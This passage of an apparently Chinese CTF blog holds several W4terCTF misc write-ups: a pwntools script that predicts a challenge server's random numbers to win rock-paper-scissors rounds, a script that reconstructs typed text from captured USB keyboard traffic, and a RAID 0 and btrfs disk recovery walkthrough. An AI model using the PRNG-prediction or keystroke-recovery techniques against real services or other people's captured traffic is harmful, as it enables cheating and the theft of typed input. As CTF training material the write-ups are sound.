== 0: taolve.sendline(\u0026#34;布\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了布\u0026#34;) if mark == 1: taolve.sendline(\u0026#34;石头\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了石头\u0026#34;) if mark == 2: taolve.sendline(\u0026#34;剪刀\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了剪刀\u0026#34;) #==============最后一局，认真模式：================== answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;1\u0026#34;) for i in range(512): 随机数 = rc.predict_getrandbits(32) mark = 随机数 % 3 轮标识符 = (随机数 // 3) ^ hhh[mark] print(\u0026#34;预测：\u0026#34;) print(hex(轮标识符)[2:].zfill(8)) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) if mark == 0: taolve.sendline(\u0026#34;布\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了布\u0026#34;) if mark == 1: taolve.sendline(\u0026#34;石头\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了石头\u0026#34;) if mark == 2: taolve.sendline(\u0026#34;剪刀\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了剪刀\u0026#34;) taolve.interactive() 运行结果： ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/10_chisato_write_up/","section":"Posts","summary":"0.题目描述 # 据说泷奈拿到了新情报？ 能不能假装千束将情报骗到","title":"misc-Chisato"},{"content":"先 nc 一下，提示在shadow中寻找flag 第一反应是写一个remote远程连接脚本看看他是不是发了未显示的字节过来 代码如下：\nfrom pwn import * context.log_level = \u0026#39;debug\u0026#39; #debug模式下可以清除地看到他发送的字节 taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 47389) taolve.interactive() 可以看到flag字节： 关闭debug模式方便搜集flag: ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/8_shadow_write_up/","section":"Posts","summary":"先 nc 一下，提示在shadow中寻找flag 第一反应是写一个r","title":"misc-Shadow"},{"content":"用wireshark分析了一下流量包后发现是usb的键盘流量，在网上找了一些现成的脚本，但是有一些效果不太好，最后选择了下面的这个脚本，成功跑出了第一阶段的 flag python脚本如下：\n#!/usr/bin/env python # coding:utf-8 import argparse import os from tempfile import NamedTemporaryFile BOOT_KEYBOARD_MAP = { 0x00: (None, None), # Reserved (no event indicated) 0x01: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # ErrorRollOver 0x02: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # POSTFail 0x03: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # ErrorUndefined 0x04: (\u0026#39;a\u0026#39;, \u0026#39;A\u0026#39;), # a 0x05: (\u0026#39;b\u0026#39;, \u0026#39;B\u0026#39;), # b 0x06: (\u0026#39;c\u0026#39;, \u0026#39;C\u0026#39;), # c 0x07: (\u0026#39;d\u0026#39;, \u0026#39;D\u0026#39;), # d 0x08: (\u0026#39;e\u0026#39;, \u0026#39;E\u0026#39;), # e 0x09: (\u0026#39;f\u0026#39;, \u0026#39;F\u0026#39;), # f 0x0a: (\u0026#39;g\u0026#39;, \u0026#39;G\u0026#39;), # g 0x0b: (\u0026#39;h\u0026#39;, \u0026#39;H\u0026#39;), # h 0x0c: (\u0026#39;i\u0026#39;, \u0026#39;I\u0026#39;), # i 0x0d: (\u0026#39;j\u0026#39;, \u0026#39;J\u0026#39;), # j 0x0e: (\u0026#39;k\u0026#39;, \u0026#39;K\u0026#39;), # k 0x0f: (\u0026#39;l\u0026#39;, \u0026#39;L\u0026#39;), # l 0x10: (\u0026#39;m\u0026#39;, \u0026#39;M\u0026#39;), # m 0x11: (\u0026#39;n\u0026#39;, \u0026#39;N\u0026#39;), # n 0x12: (\u0026#39;o\u0026#39;, \u0026#39;O\u0026#39;), # o 0x13: (\u0026#39;p\u0026#39;, \u0026#39;P\u0026#39;), # p 0x14: (\u0026#39;q\u0026#39;, \u0026#39;Q\u0026#39;), # q 0x15: (\u0026#39;r\u0026#39;, \u0026#39;R\u0026#39;), # r 0x16: (\u0026#39;s\u0026#39;, \u0026#39;S\u0026#39;), # s 0x17: (\u0026#39;t\u0026#39;, \u0026#39;T\u0026#39;), # t 0x18: (\u0026#39;u\u0026#39;, \u0026#39;U\u0026#39;), # u 0x19: (\u0026#39;v\u0026#39;, \u0026#39;V\u0026#39;), # v 0x1a: (\u0026#39;w\u0026#39;, \u0026#39;W\u0026#39;), # w 0x1b: (\u0026#39;x\u0026#39;, \u0026#39;X\u0026#39;), # x 0x1c: (\u0026#39;y\u0026#39;, \u0026#39;Y\u0026#39;), # y 0x1d: (\u0026#39;z\u0026#39;, \u0026#39;Z\u0026#39;), # z 0x1e: (\u0026#39;1\u0026#39;, \u0026#39;!\u0026#39;), # 1 0x1f: (\u0026#39;2\u0026#39;, \u0026#39;@\u0026#39;), # 2 0x20: (\u0026#39;3\u0026#39;, \u0026#39;#\u0026#39;), # 3 0x21: (\u0026#39;4\u0026#39;, \u0026#39;$\u0026#39;), # 4 0x22: (\u0026#39;5\u0026#39;, \u0026#39;%\u0026#39;), # 5 0x23: (\u0026#39;6\u0026#39;, \u0026#39;^\u0026#39;), # 6 0x24: (\u0026#39;7\u0026#39;, \u0026#39;\u0026amp;\u0026#39;), # 7 0x25: (\u0026#39;8\u0026#39;, \u0026#39;*\u0026#39;), # 8 0x26: (\u0026#39;9\u0026#39;, \u0026#39;(\u0026#39;), # 9 0x27: (\u0026#39;0\u0026#39;, \u0026#39;)\u0026#39;), # 0 0x28: (\u0026#39;\\n\u0026#39;, \u0026#39;\\n\u0026#39;), # Return (ENTER) 0x29: (\u0026#39;[ESC]\u0026#39;, \u0026#39;[ESC]\u0026#39;), # Escape 0x2a: (\u0026#39;\\b\u0026#39;, \u0026#39;\\b\u0026#39;), # Backspace 0x2b: (\u0026#39;\\t\u0026#39;, \u0026#39;\\t\u0026#39;), # Tab 0x2c: (\u0026#39; \u0026#39;, \u0026#39; \u0026#39;), # Spacebar 0x2d: (\u0026#39;-\u0026#39;, \u0026#39;_\u0026#39;), # - 0x2e: (\u0026#39;=\u0026#39;, \u0026#39;+\u0026#39;), # = 0x2f: (\u0026#39;[\u0026#39;, \u0026#39;{\u0026#39;), # [ 0x30: (\u0026#39;]\u0026#39;, \u0026#39;}\u0026#39;), # ] 0x31: (\u0026#39;\\\\\u0026#39;, \u0026#39;|\u0026#39;), # \\ 0x32: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Non-US # and ~ 0x33: (\u0026#39;;\u0026#39;, \u0026#39;:\u0026#39;), # ; 0x34: (\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;), # \u0026#39; 0x35: (\u0026#39;`\u0026#39;, \u0026#39;~\u0026#39;), # ` 0x36: (\u0026#39;,\u0026#39;, \u0026#39;\u0026lt;\u0026#39;), # , 0x37: (\u0026#39;.\u0026#39;, \u0026#39;\u0026gt;\u0026#39;), # . 0x38: (\u0026#39;/\u0026#39;, \u0026#39;?\u0026#39;), # / 0x39: (\u0026#39;[CAPSLOCK]\u0026#39;, \u0026#39;[CAPSLOCK]\u0026#39;), # Caps Lock 0x3a: (\u0026#39;[F1]\u0026#39;, \u0026#39;[F1]\u0026#39;), # F1 0x3b: (\u0026#39;[F2]\u0026#39;, \u0026#39;[F2]\u0026#39;), # F2 0x3c: (\u0026#39;[F3]\u0026#39;, \u0026#39;[F3]\u0026#39;), # F3 0x3d: (\u0026#39;[F4]\u0026#39;, \u0026#39;[F4]\u0026#39;), # F4 0x3e: (\u0026#39;[F5]\u0026#39;, \u0026#39;[F5]\u0026#39;), # F5 0x3f: (\u0026#39;[F6]\u0026#39;, \u0026#39;[F6]\u0026#39;), # F6 0x40: (\u0026#39;[F7]\u0026#39;, \u0026#39;[F7]\u0026#39;), # F7 0x41: (\u0026#39;[F8]\u0026#39;, \u0026#39;[F8]\u0026#39;), # F8 0x42: (\u0026#39;[F9]\u0026#39;, \u0026#39;[F9]\u0026#39;), # F9 0x43: (\u0026#39;[F10]\u0026#39;, \u0026#39;[F10]\u0026#39;), # F10 0x44: (\u0026#39;[F11]\u0026#39;, \u0026#39;[F11]\u0026#39;), # F11 0x45: (\u0026#39;[F12]\u0026#39;, \u0026#39;[F12]\u0026#39;), # F12 0x46: (\u0026#39;[PRINTSCREEN]\u0026#39;, \u0026#39;[PRINTSCREEN]\u0026#39;), # Print Screen 0x47: (\u0026#39;[SCROLLLOCK]\u0026#39;, \u0026#39;[SCROLLLOCK]\u0026#39;), # Scroll Lock 0x48: (\u0026#39;[PAUSE]\u0026#39;, \u0026#39;[PAUSE]\u0026#39;), # Pause 0x49: (\u0026#39;[INSERT]\u0026#39;, \u0026#39;[INSERT]\u0026#39;), # Insert 0x4a: (\u0026#39;[HOME]\u0026#39;, \u0026#39;[HOME]\u0026#39;), # Home 0x4b: (\u0026#39;[PAGEUP]\u0026#39;, \u0026#39;[PAGEUP]\u0026#39;), # Page Up 0x4c: (\u0026#39;[DELETE]\u0026#39;, \u0026#39;[DELETE]\u0026#39;), # Delete Forward 0x4d: (\u0026#39;[END]\u0026#39;, \u0026#39;[END]\u0026#39;), # End 0x4e: (\u0026#39;[PAGEDOWN]\u0026#39;, \u0026#39;[PAGEDOWN]\u0026#39;), # Page Down 0x4f: (\u0026#39;[RIGHTARROW]\u0026#39;, \u0026#39;[RIGHTARROW]\u0026#39;), # Right Arrow 0x50: (\u0026#39;[LEFTARROW]\u0026#39;, \u0026#39;[LEFTARROW]\u0026#39;), # Left Arrow 0x51: (\u0026#39;[DOWNARROW]\u0026#39;, \u0026#39;[DOWNARROW]\u0026#39;), # Down Arrow 0x52: (\u0026#39;[UPARROW]\u0026#39;, \u0026#39;[UPARROW]\u0026#39;), # Up Arrow 0x53: (\u0026#39;[NUMLOCK]\u0026#39;, \u0026#39;[NUMLOCK]\u0026#39;), # Num Lock 0x54: (\u0026#39;[KEYPADSLASH]\u0026#39;, \u0026#39;/\u0026#39;), # Keypad / 0x55: (\u0026#39;[KEYPADASTERISK]\u0026#39;, \u0026#39;*\u0026#39;), # Keypad * 0x56: (\u0026#39;[KEYPADMINUS]\u0026#39;, \u0026#39;-\u0026#39;), # Keypad - 0x57: (\u0026#39;[KEYPADPLUS]\u0026#39;, \u0026#39;+\u0026#39;), # Keypad + 0x58: (\u0026#39;[KEYPADENTER]\u0026#39;, \u0026#39;[KEYPADENTER]\u0026#39;), # Keypad ENTER 0x59: (\u0026#39;[KEYPAD1]\u0026#39;, \u0026#39;1\u0026#39;), # Keypad 1 and End 0x5a: (\u0026#39;[KEYPAD2]\u0026#39;, \u0026#39;2\u0026#39;), # Keypad 2 and Down Arrow 0x5b: (\u0026#39;[KEYPAD3]\u0026#39;, \u0026#39;3\u0026#39;), # Keypad 3 and PageDn 0x5c: (\u0026#39;[KEYPAD4]\u0026#39;, \u0026#39;4\u0026#39;), # Keypad 4 and Left Arrow 0x5d: (\u0026#39;[KEYPAD5]\u0026#39;, \u0026#39;5\u0026#39;), # Keypad 5 0x5e: (\u0026#39;[KEYPAD6]\u0026#39;, \u0026#39;6\u0026#39;), # Keypad 6 and Right Arrow 0x5f: (\u0026#39;[KEYPAD7]\u0026#39;, \u0026#39;7\u0026#39;), # Keypad 7 and Home 0x60: (\u0026#39;[KEYPAD8]\u0026#39;, \u0026#39;8\u0026#39;), # Keypad 8 and Up Arrow 0x61: (\u0026#39;[KEYPAD9]\u0026#39;, \u0026#39;9\u0026#39;), # Keypad 9 and Page Up 0x62: (\u0026#39;[KEYPAD0]\u0026#39;, \u0026#39;0\u0026#39;), # Keypad 0 and Insert 0x63: (\u0026#39;[KEYPADPERIOD]\u0026#39;, \u0026#39;.\u0026#39;), # Keypad . and Delete 0x64: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Non-US \\ and | 0x65: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Application 0x66: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Power 0x67: (\u0026#39;[KEYPADEQUALS]\u0026#39;, \u0026#39;=\u0026#39;), # Keypad = 0x68: (\u0026#39;[F13]\u0026#39;, \u0026#39;[F13]\u0026#39;), # F13 0x69: (\u0026#39;[F14]\u0026#39;, \u0026#39;[F14]\u0026#39;), # F14 0x6a: (\u0026#39;[F15]\u0026#39;, \u0026#39;[F15]\u0026#39;), # F15 0x6b: (\u0026#39;[F16]\u0026#39;, \u0026#39;[F16]\u0026#39;), # F16 0x6c: (\u0026#39;[F17]\u0026#39;, \u0026#39;[F17]\u0026#39;), # F17 0x6d: (\u0026#39;[F18]\u0026#39;, \u0026#39;[F18]\u0026#39;), # F18 0x6e: (\u0026#39;[F19]\u0026#39;, \u0026#39;[F19]\u0026#39;), # F19 0x6f: (\u0026#39;[F20]\u0026#39;, \u0026#39;[F20]\u0026#39;), # F20 0x70: (\u0026#39;[F21]\u0026#39;, \u0026#39;[F21]\u0026#39;), # F21 0x71: (\u0026#39;[F22]\u0026#39;, \u0026#39;[F22]\u0026#39;), # F22 0x72: (\u0026#39;[F23]\u0026#39;, \u0026#39;[F23]\u0026#39;), # F23 0x73: (\u0026#39;[F24]\u0026#39;, \u0026#39;[F24]\u0026#39;), # F24 } def parse_boot_keyboard_report(data: bytearray): # 数据解析函数 modifiers = data[0] # 修改键字节 keys = data[2:8] # 键码字节 # 将修改键字节中的位解码为按键修饰符 ctrl = (modifiers \u0026amp; 0x11) != 0 shift = (modifiers \u0026amp; 0x22) != 0 alt = (modifiers \u0026amp; 0x44) != 0 gui = (modifiers \u0026amp; 0x88) != 0 # 解析键码字节并将其映射为字符 characters = [] for key in keys: if key != 0: # 键码不为0则查询映射表 if key in BOOT_KEYBOARD_MAP: characters.append(BOOT_KEYBOARD_MAP[key][shift]) else: characters.append(None) return (ctrl, shift, alt, gui, characters) def help_formatter(prog): return argparse.HelpFormatter(prog, max_help_position=40) def main(): # 解析命令行参数 parser = argparse.ArgumentParser( description=\u0026#39;Parse keyboard report data and output as text\u0026#39;, formatter_class=help_formatter) parser.add_argument(\u0026#39;pcapng_file\u0026#39;, help=\u0026#39;path to the pcapng file\u0026#39;) args = parser.parse_args() # 通过tshark解析pcapng文件，获取键盘数据包 # 需要先安装wireshark，并且添加到环境变量中 tmpfile = NamedTemporaryFile(delete=False) tmpfile.close() command = \u0026#34;tshark -r %s -T fields -e usbhid.data -e usb.capdata \u0026gt; %s\u0026#34; % ( args.pcapng_file, tmpfile.name) os.system(command) with open(tmpfile.name, \u0026#39;r\u0026#39;) as f: lines = f.readlines() os.unlink(tmpfile.name) # 解析键盘数据包，获取输入字符 text = \u0026#34;\u0026#34; for line in lines: capdata = line.strip().replace(\u0026#39;:\u0026#39;, \u0026#39;\u0026#39;) if capdata: data = bytearray.fromhex(capdata) characters = parse_boot_keyboard_report(data)[-1] for character in characters: if character: text += character else: pass raw_text = repr(text) print(f\u0026#39;Raw output:\\n{raw_text}\u0026#39;) print(f\u0026#39;Text output:\\n{text}\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: main() 运行结果如下： flag如下： Ww4terCTF[CAPSLOCK]{[YOu_-@2r3_tH3_-[CAPSLOCK]MmaST3R_-o1+-USB-[CAPSLOCK]Ttr@2 f[CAPSLOCK]f!1C_-aN@2Iys!1s}]\n一阶段flag特殊符[CAPSLOCK]未删除，按照[CAPSLOCK]的规则将flag修改一下： Ww4terCTF{[yoU_-@2R3_Th3_-MmaST3R_-o1+-USB-tTR@Ff!1C_-aN@2Iys!1s}]\n还可以明显看出flag有字符重复输入，所以删掉那些有可能是重复输入的字符： W4terCTF{yoU_@R3_Th3_MaST3R_o1+_USB_tR@Ff!C_aN@Iys!s}\n但是提交flag的时候显示flag错误，则可能是一些多余字符未删除，这里我们发现o1后面的 \u0026lsquo;+\u0026rsquo; 字符好像是多余的，删除后得到： W4terCTF{yoU_@R3_Th3_MaST3R_o1_USB_tR@Ff!C_aN@Iys!s}\n提交 flag，正确！\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_w4ter/9_usb-hacker_write_up/","section":"Posts","summary":"用wireshark分析了一下流量包后发现是usb的键盘流量","title":"misc-USB Hacker"},{"content":"本题wp的结构如下：（前排提示，该题wp有点多）\n题目描述 # ​\t2023 年 3 月 31 日半夜，暴雨。 ​\tGZTime 发现已经跑了?整天的 python 脚本挂了，满眼所见皆为 IO Error。 ​\t「坏了！我还得靠这玩意交作业！」他想，之后赶忙去检查了一下硬盘的情况——看起来数据都正常，只是大概由于暴雨的缘故（bushi）关于 RAID 的元信息全不见了—— 而 GZTime 也忘记了当初组 RAID 的时候的各项参数……一番搜索，恢复数据似乎得花不少钱，但是他听说这里似乎在做什么安全相关的东西——或许你能帮上忙？\n一 判断磁盘顺序 # 1.初步分析 # 先下载附件，发现是8 个磁盘文件， 题目的hint提示:“这一组磁盘的 RAID 类型为 RAID 0”，所以用我们最好的朋友——搜索引擎来搜索相关信息，得知要把这8个磁盘文件当作一个逻辑卷来读取访问。 接着再查找组装RAID 0 的方法，发现需要按照一定的顺序来组装，所以涉及到判断磁盘文件顺序的问题。 但是要如何判断呢？在搜索引擎搜索得到的答案都不太好操作，最后在发现 hackergame2021 的阵列恢复大师 一题与我们的题目有着共通之处，于是参考 taoky师傅 的wp 来组装我们的磁盘， https://gitee.com/Scripter_doge/hackergame2021-writeups/blob/master/official/%E9%98%B5%E5%88%97%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%B8%88/README.md # 2.确定首尾文件与块的大小 # 先在虚拟机里用file命令查看我们的8个映像文件，\nfile *.img 得到： 可以看到 UkAQZEahRpFP.img 冒号后面有“DOS、MBR boot sector”，有 MBR 头，并且第一块分区 ID 是 0xee。这表明整块磁盘实际上是 GPT 格式的，并且 UkAQZEahRpFP.img 就是我们的第一块盘。 接下来要分析 GPT 的元信息，将文件拖到010editor或者其他十六进制编辑器来查看，具体操作紧跟taoky师傅的题解： 我们使用的命令：\n(echo \u0026#34;P5 1024 16384 255\u0026#34;; cat UkAQZEahRpFP.img) \u0026gt; ./UkAQZEahRpFP.pgm 用Honeyview打开图片得到： 参考taoky师傅的题解： 我们磁盘对应的十六进制文本： 使用命令：\nfor i in *.img; do echo $i \u0026amp;\u0026amp; hexdump -C $i | grep \u0026#39;EFI PART\u0026#39;; done 看看可能的块边缘（0x10000 = 64 KB 的倍数)的情况：\nfor i in *.img; do echo $i \u0026amp;\u0026amp; hexdump -C $i | grep \u0026#39;0000 \u0026#39;; done \u0026gt; ./tmp1 但是并没有什么有意思的字符串，有点小失望 所以我们直接用十六进制编辑器打开这8个磁盘文件，先用ctrl+F 尝试搜索一些字符串“flag”、“key”、“ctf”等等，（用 ctrl+shift+F 多文件查找更方便），发现在BpStXfb7DgbO.img和KESNic6iRwY3.img文件中有许多的“flag.7z”字符串，看来我们的flag最后会在一个7z压缩包里。 在十六进制编辑器观察UkAQZEahRpFP.img的数据，可以明显发现：\n0x200000 前面的数据被截断了，代表 0x200000 是块大小的倍数；\n0x200000 到 0x2c0000 是明显连续的数据，中间没有被截断；\n0x2c0000 后开始出现了明显的数据截断。\n所以可以推得块大小是 0x2c0000 - 0x200000 = 786432 B = 768 KB。\n（其实恢复的磁盘分块大小为 256 扇区、128KB大小，该方法可能会稍微放大一些，但是在实战中还是可以用的，只是后面拼图的时候不太好看出来）\n但是,当我们用同样的方法来计算其他硬盘文件的块大小的时候，会发现不同文件的块大小并不完全一样，所以这里我们采用他们的较大公约数 128 KB 来作为他们的块大小。\n3.Python代码求磁盘顺序 # 下一步我们需要知道盘的顺序。虽然可以找刚好被截断的文件一个个推顺序，~~但是直接在taoky师傅的代码上改一改就用不是更简单吗？~~但我们也可以借这个机会学习一下优秀师傅的Python代码，也学习一下Python的 matplotlib 库：\nimport numpy as np import matplotlib.pyplot as plt files = [\u0026#39;UkAQZEahRpFP.img\u0026#39;, \u0026#39;G6i0ErEQwiFm.img\u0026#39;, \u0026#39;NKGGtuKv6Qr4.img\u0026#39;, \u0026#39;O53ORjQLbNjg.img\u0026#39;, \u0026#39;q8snWXN5Ltwx.img\u0026#39;, \u0026#39;Y1et5EJL2XGX.img\u0026#39;, \u0026#39;BpStXfb7DgbO.img\u0026#39;, \u0026#39;KESNic6iRwY3.img\u0026#39;] # 第一块和最后一块盘是已知的 \u0026#39;\u0026#39;\u0026#39; 拼图游戏的玩法： 鼠标拖动上面8个文件的字符串，改变他们的顺序后运行代码，比对生成的图片，找出正确的磁盘顺序 \u0026#39;\u0026#39;\u0026#39; my_block = 128 # 我们的块的大小,可以取128,256,512等等,多取几次来判断 start = 0 # 从头开始读取 sz = 16 * 1024 * 1024 # 读取的文件大小 (bytes) n = my_block * 1024 # 块大小 b = 1024 # 用于求和的小块大小 data = [] for fn in files: with open(\u0026#34;./\u0026#34; + fn, \u0026#39;rb\u0026#39;) as f: f.seek(start, 0) data.append(np.frombuffer(f.read(sz), dtype=np.uint8)) p = [[np.sum(data[f][i * n + j * b: i * n + j * b + b]) for f in range(len(files)) for j in range(n // b)] for i in range(sz // n)] # i: 块, j: 小块, f: 文件 graph = np.array(p) print(graph.shape) plt.matshow(graph, aspect=\u0026#39;auto\u0026#39;) plt.xticks(np.arange(0, my_block*8+0.1, step=my_block)) plt.yticks(np.arange(0, 128.1, step=16)) plt.show() 最后得到的正确顺序是：\nfiles = [\u0026#39;UkAQZEahRpFP.img\u0026#39;, \u0026#39;G6i0ErEQwiFm.img\u0026#39;, \u0026#39;NKGGtuKv6Qr4.img\u0026#39;, \u0026#39;O53ORjQLbNjg.img\u0026#39;, \u0026#39;q8snWXN5Ltwx.img\u0026#39;, \u0026#39;Y1et5EJL2XGX.img\u0026#39;, \u0026#39;BpStXfb7DgbO.img\u0026#39;, \u0026#39;KESNic6iRwY3.img\u0026#39;] 二 组装磁盘文件 # 下一步：按我们求出顺序挂载分区（挂载的时候就可以检测我们的顺序是否有误了） 我们使用Linux losetup 命令来设置循环设备，关于循环设备（loop）： 循环设备可把文件虚拟成区块设备，籍以模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。\n//先看看我们可用的loop，一般只会显示一个设备， //每挂载一个文件使用一次查看下一个可用loop,不过一般来说都是按顺序的，直接挂载也可以。 sudo losetup -f //然后按顺序挂载，taoky师傅采用的是只读挂载，避免有错误的写入： sudo losetup --read-only /dev/loop0 UkAQZEahRpFP.img sudo losetup --read-only /dev/loop1 G6i0ErEQwiFm.img sudo losetup --read-only /dev/loop2 NKGGtuKv6Qr4.img sudo losetup --read-only /dev/loop3 O53ORjQLbNjg.img sudo losetup --read-only /dev/loop4 q8snWXN5Ltwx.img sudo losetup --read-only /dev/loop5 Y1et5EJL2XGX.img sudo losetup --read-only /dev/loop6 BpStXfb7DgbO.img sudo losetup --read-only /dev/loop7 KESNic6iRwY3.img //不过我们这里采用的是直接挂载， //因为后面会出现需要读写权限的操作，如果采用只读就要回来再走一遍了（心累） sudo losetup /dev/loop0 UkAQZEahRpFP.img sudo losetup /dev/loop1 G6i0ErEQwiFm.img sudo losetup /dev/loop2 NKGGtuKv6Qr4.img sudo losetup /dev/loop3 O53ORjQLbNjg.img sudo losetup /dev/loop4 q8snWXN5Ltwx.img sudo losetup /dev/loop5 Y1et5EJL2XGX.img sudo losetup /dev/loop6 BpStXfb7DgbO.img sudo losetup /dev/loop7 KESNic6iRwY3.img //使用mdadm来组装 sudo apt install mdadm sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /dev/md0 /dev/loop{0,1,2,3,4,5,6,7} //如果loop是连续的可以简写为： sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /dev/md0 /dev/loop{0..7} 输出：mdadm: array /dev/md0 built and started. //挂载我们的/dev/md0 mkdir mountpoint sudo mount -o ro /dev/md0p1 mountpoint/ cd mountpoint //激动人心的时刻到了！！！ //ls 查看有什么文件 cat 读文件 ls cat note.txt 输出如下图： 好了，人已经有点懵了，我们之前看到的flag.7z在哪里？难道是什么奇怪的隐写取证吗？？ 在接下来的一长段时间里，我拿010editor仔细查看了一下8个文件的数据，也没有任何头绪，最后实在没思路了和GZ学长联系了一下，题目补充了一个重要的hint：磁盘上的文件系统类型是 btrfs 后来才发现原来ubuntu也已经告诉我了，不过当时不了解btrfs文件系统，也没有往这方面多想 名字下面就告诉我们是btrfs文件系统了/悲/ 三 挂载隐藏卷，取得flag # 方法一：直接在Ubuntu或kali等虚拟机构建btrfs文件系统 # 接下来就是一连串的构建btrfs文件操作系统和重新开始挂载磁盘之路了： （赶时间的同学可以忽略，因为后面有更加简单的方法）\nsudo apt install btrfs-progs //装就完了 sudo df -ha //看看文件系统磁盘使用情况 fallocate -l 512M /tmp/btrfs.img mkfs.btrfs /tmp/btrfs.img sudo mkdir /mnt/btrfs sudo mount /tmp/btrfs.img /mnt/btrfs sudo chmod 777 /mnt/btrfs sudo mkdir my_btrfs sudo mount /tmp/btrfs.img my_btrfs sudo mount /dev/md0p1 my_btrfs /mnt/sysimage df my_btrfs //判断是否是btrfs文件系统 cd my_btrfs sudo mkdir mountpoint //需要读写权限 btrfs filesystem df mountpoint sudo mount -o ro /dev/md0p1 mountpoint ls cat note* 输出的结果还是一样的， 这个时候我们就要好好想想还有哪里可以藏flag文件了。 重点在btrfs文件系统的特殊之处：Btrfs文件系统有subvolume与snapshot功能，及可以创建子卷与快照。 查看子卷的命令：\nsudo apt install btrfs-progs //在mountpoint目录查看子卷 btrfs subvol list ./ btrfs subvol list 这个命令非常关键，他能让我们发现原来在这个磁盘下有着隐藏着的子卷，看到他们的名字我们就知道了： @data 与 @secret，flag 应该就在 @secret里面了。 搭载子卷的命令：\n//将挂载卷的ID改为@secret的ID sudo btrfs subvolume set-default 258 /mnt/sysimage/mountpoint //重新挂载 cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* //将挂载卷的ID改为@data的ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* ls 不过，在这一整个过程，非常容易出现以下这行字(也有可能是英文版的)：\nmount: /mnt/mountpoint: 文件系统类型错误、选项错误、/dev/md0p1 上有坏超级块、缺少代码页或帮助程序或其他错误. dmesg(1) may have more information after failed mount system call. 可能是因为我们在建立btrfs文件系统时有一些小错误，或是多次挂载导致硬盘文件有了损坏。 这里可以选择执行命令来查看问题并修复，不过有点复杂。\nsudo dmesg 所以，我在多次尝试失败后采用了另一种方法——直接下载带有btrfs文件系统的linux系统，与ubuntu齐名的Fedora： https://getfedora.org/zh_Hans_CN/ 后面的整个操作就一路绿灯啦！\n方法二：安装Fedora，直接挂载隐藏卷 # 第二、第三部分全部命令（Fedora虚拟机下） # //第一步：连接共享文件夹，将8个磁盘文件组装起来： vmware-hgfsclient sudo mkdir -p /mnt/hgfs sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs_fuse,allow_other cd /mnt/hgfs cd share ls sudo losetup -f //输出：/dev/loop3 sudo losetup /dev/loop3 UkAQZEahRpFP.img sudo losetup /dev/loop4 G6i0ErEQwiFm.img sudo losetup /dev/loop5 NKGGtuKv6Qr4.img sudo losetup /dev/loop6 O53ORjQLbNjg.img sudo losetup /dev/loop7 q8snWXN5Ltwx.img sudo losetup /dev/loop8 Y1et5EJL2XGX.img sudo losetup /dev/loop9 BpStXfb7DgbO.img sudo losetup /dev/loop10 KESNic6iRwY3.img sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /mnt/md0 /dev/loop{3,4,5,6,7,8,9,10} //输出：mdadm: array /dev/md0 built and started. //------------------------------------------------------// //第二步：在btrfs文件系统下挂载磁盘 sudo blkid //查看btrfs文件系统的目录 //部分输出：/dev/nvme0n1p3: LABEL=\u0026#34;fedora_localhost-live\u0026#34; UUID=\u0026#34;ddb495f5-ddf3-4dfc-bd6f-9ea32304a4ab\u0026#34; UUID_SUB=\u0026#34;c7d187e8-96d6-4301-a1a0-0ee1b5adb011\u0026#34; BLOCK_SIZE=\u0026#34;4096\u0026#34; TYPE=\u0026#34;btrfs\u0026#34; PARTUUID=\u0026#34;a5b72680-20da-4446-9e5b-e35eacb881dc\u0026#34; sudo df -ha //查看/dev/nvme0n1p3挂载的目录 //部分输出：/dev/nvme0n1p3 19G 2.9G 16G 16% /mnt/sysimage cd /mnt/sysimage sudo mkdir mountpoint sudo mount /dev/md0p1 mo* cd mo* ls -a //-a 查看是否有隐藏文件 //输出：. .. note.txt cat note* /*输出：Wow, you found me! But it doesn\u0026#39;t look like there\u0026#39;s anything here...*/ //----------------------------------------------------// //第三步：挂载隐藏卷，执行脚本获得密码，解开压缩包得flag sudo btrfs subvolume list ./ /* 输出： ID 256 gen 12 top level 5 path @ ID 257 gen 10 top level 5 path @data ID 258 gen 10 top level 5 path @secret */ sudo btrfs subvolume set-default 258 /mnt/sysimage/mountpoint //将挂载卷的ID改为@secret的ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* //输出：flag.7z cp flag.7z /mnt/hgfs/share //复制到我们的真机里 //打开提示需要密码，输入后面代码执行得到的密码就可以得到flag啦 sudo btrfs subvolume set-default 257 /mnt/sysimage/mountpoint //将挂载卷的ID改为@data的ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* ls //输出： //calc.py data cp calc.py /mnt/hgfs/share //复制到我们的真机里,方便解读代码，也可以试着跑一跑，发现要在原文件夹执行，然后就会输出flag.7z的密码 python3 